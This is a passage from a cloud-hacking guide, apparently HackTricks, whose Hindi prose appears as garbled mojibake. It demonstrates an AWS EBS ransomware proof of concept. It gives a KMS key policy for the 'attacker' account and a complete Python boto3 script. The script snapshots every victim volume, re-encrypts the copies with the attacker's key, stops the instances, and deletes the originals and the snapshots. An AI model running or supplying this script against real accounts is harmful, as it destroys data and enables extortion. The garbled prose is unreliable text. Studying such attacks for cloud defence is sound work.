рд▓рд┐рдП рд▓рдХреНрд╖реНрдп рдмрдирд╛ рд░рд╣реЗ рд╣реИрдВ, рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ AWS рдЦрд╛рддреЗ рдХреЗ рдЙрд▓реНрд▓рдВрдШрди рдХреЗ рддрд╣рдд рд╣реИред

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 рд░реИрдирд╕рдорд╡реЗрдпрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд╕рдорд╛рдиред рдпрд╣ рд╣рдорд▓рд╛ рдЬреБрдбрд╝реЗ рд╣реБрдП EBS рд╡реЙрд▓реНрдпреВрдо рдХреА рдкреНрд░рддрд┐рдпрд╛рдВ рд╕реНрдиреИрдкрд╢реЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдПрдЧрд╛, 'рд╣рдорд▓рд╛рд╡рд░' рдЦрд╛рддреЗ рд╕реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрд▓рдмреНрдз рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП EBS рд╡реЙрд▓реНрдпреВрдо рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдЧрд╛, рдлрд┐рд░ EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рд╕реЗ рдореВрд▓ EBS рд╡реЙрд▓реНрдпреВрдо рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╣рдЯрд╛ рджреЗрдЧрд╛, рдФрд░ рдЕрдВрдд рдореЗрдВ рдирдП рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕реНрдиреИрдкрд╢реЙрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛ред ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдХреЗрд╡рд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИ рдЬреЛ рдЦрд╛рддреЗ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИрдВред

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдиреЗ рдореВрд▓ EBS рд╡реЙрд▓реНрдпреВрдо рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рд░реЛрдХ рджрд┐рдпрд╛ред рдЕрдм рдореВрд▓ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╡реЙрд▓реНрдпреВрдо рдЪрд▓реЗ рдЧрдП рд╣реИрдВред

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

рдЕрдЧрд▓рд╛, 'рд╣рдорд▓рд╛рд╡рд░' рдЦрд╛рддреЗ рдореЗрдВ рдХреБрдВрдЬреА рдиреАрддрд┐ рдкрд░ рд▓реМрдЯреЗрдВ рдФрд░ рдХреБрдВрдЬреА рдиреАрддрд┐ рд╕реЗ 'рдмрд╛рд╣рд░реА рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди' рдиреАрддрд┐ рдирд┐рдпрдо рдХреЛ рд╣рдЯрд╛ рджреЗрдВред
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
рдПрдХ рдкрд▓ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдирдП рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рдХреБрдВрдЬреА рдиреАрддрд┐ рдХрд╛ рдкреНрд░рдЪрд╛рд░ рд╣реЛ рд╕рдХреЗред рдлрд┐рд░ 'рдкреАрдбрд╝рд┐рдд' рдЦрд╛рддреЗ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВ рдФрд░ рдирдП рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рд╕реЗ рдПрдХ рдХреЛ рдЕрдЯреИрдЪ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдЖрдк рдкрд╛рдПрдВрдЧреЗ рдХрд┐ рдЖрдк рд╡реЙрд▓реНрдпреВрдо рдХреЛ рдЕрдЯреИрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

рд▓реЗрдХрд┐рди рдЬрдм рдЖрдк рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рдХреЗ рд╕рд╛рде EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдмрд╕ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдФрд░ 'рдкреЗрдВрдбрд┐рдВрдЧ' рд╕реНрдерд┐рддрд┐ рд╕реЗ 'рд░реБрдХрд╛ рд╣реБрдЖ' рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣рдореЗрд╢рд╛ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдЪрд▓рд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЕрдЯреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ EBS рд╡реЙрд▓реНрдпреВрдо рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдВрдЬреА рдиреАрддрд┐ рдЕрдм рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреАред

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

рдпрд╣ рд╡рд╣ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╣реИред рдпрд╣ 'рдкреАрдбрд╝рд┐рдд' рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП AWS рдХреНрд░реЗрдбреНрд╕ рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХреБрдВрдЬреА рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрд▓рдмреНрдз AWS ARN рдорд╛рди рд▓реЗрддрд╛ рд╣реИред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рдХреНрд╖рд┐рдд AWS рдЦрд╛рддреЗ рдореЗрдВ рд╕рднреА EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдЬреБрдбрд╝реЗ рд╕рднреА рдЙрдкрд▓рдмреНрдз EBS рд╡реЙрд▓реНрдпреВрдо рдХреА рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХреЙрдкреА рдмрдирд╛рдПрдЧреА, рдлрд┐рд░ рд╣рд░ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рд░реЛрдХ рджреЗрдЧреА, рдореВрд▓ EBS рд╡реЙрд▓реНрдпреВрдо рдХреЛ рдЕрдЯреИрдЪ рд╕реЗ рд╣рдЯрд╛ рджреЗрдЧреА, рдЙрдиреНрд╣реЗрдВ рд╣рдЯрд╛ рджреЗрдЧреА, рдФрд░ рдЕрдВрддрддрдГ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕рднреА рд╕реНрдиреИрдкрд╢реЙрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрдЧреАред рдЗрд╕рд╕реЗ рд▓рдХреНрд╖рд┐рдд 'рдкреАрдбрд╝рд┐рдд' рдЦрд╛рддреЗ рдореЗрдВ рдХреЗрд╡рд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рд░рд╣ рдЬрд╛рдПрдВрдЧреЗред рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рдкрд░реАрдХреНрд╖рдг рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХрд░реЗрдВ, рдпрд╣ рд╡рд┐рдирд╛рд╢рдХрд╛рд░реА рд╣реИ рдФрд░ рд╕рднреА рдореВрд▓ EBS рд╡реЙрд▓реНрдпреВрдо рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛ред рдЖрдк рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ KMS рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реНрдиреИрдкрд╢реЙрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЙрдирдХреЗ рдореВрд▓ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмрд╣рд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдореИрдВ рдЖрдкрдХреЛ рдпрд╣ рдмрддрд╛рдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛ рдХрд┐ рдпрд╣ рдЕрдВрддрддрдГ рдПрдХ рд░реИрдирд╕рдорд╡реЗрдпрд░ PoC рд╣реИред
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
